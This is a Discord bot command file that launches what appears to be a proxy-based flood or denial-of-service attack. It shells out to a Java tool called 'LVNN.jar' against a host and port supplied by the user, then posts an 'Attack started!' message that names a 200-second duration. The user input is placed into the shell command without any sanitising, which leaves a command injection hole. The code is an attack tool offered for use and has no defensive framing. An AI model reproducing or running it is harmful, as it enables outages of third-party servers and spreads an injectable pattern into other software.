const Discord = require("discord.js");

exports.run = async (client, message, args) => {
const host = args.join(" ").split(":").slice(0,1)
const port = message.content.split (":")[1]
const proxy = args.join(" ").slice(2)
var exec = require('child_process').exec
exec(`java -Dperdelay=2500 -Ddelay=1 -Drmnwp=false -jar LVNN.jar ${host}:${port} 10000 1 LVNN socks_proxies.txt s4`, (error, stdout, stderr) => {
});
console.log('An Attack Launched Discord ID:' +  message.guild.id)
const embed = new Discord.MessageEmbed()
	.setColor('RANDOM')
	.setTitle('🔥 ** ')
	.setTimestamp()
	.setDescription("**► Method: LVNN 💥** \n \n ► Attack started! ✅ \n  ► Đã bắt đầu! ✅ \n ► 200 giây!! 🕒 \n ☆ ☆")
	.setFooter('© Developer Mareczekkkk#9738.', client.user.avatarURL)
	.setTimestamp()
	.setThumbnail("")
 message.channel.send(embed);
  }

exports.conf = {
  enabled: true,
  guildOnly: false,
  aliases: ['lvnn'],
  permLevel: 0
}

exports.help = {
  name: 'lvnn',
  description: 'Özel',
  usage: 'lvnn'
}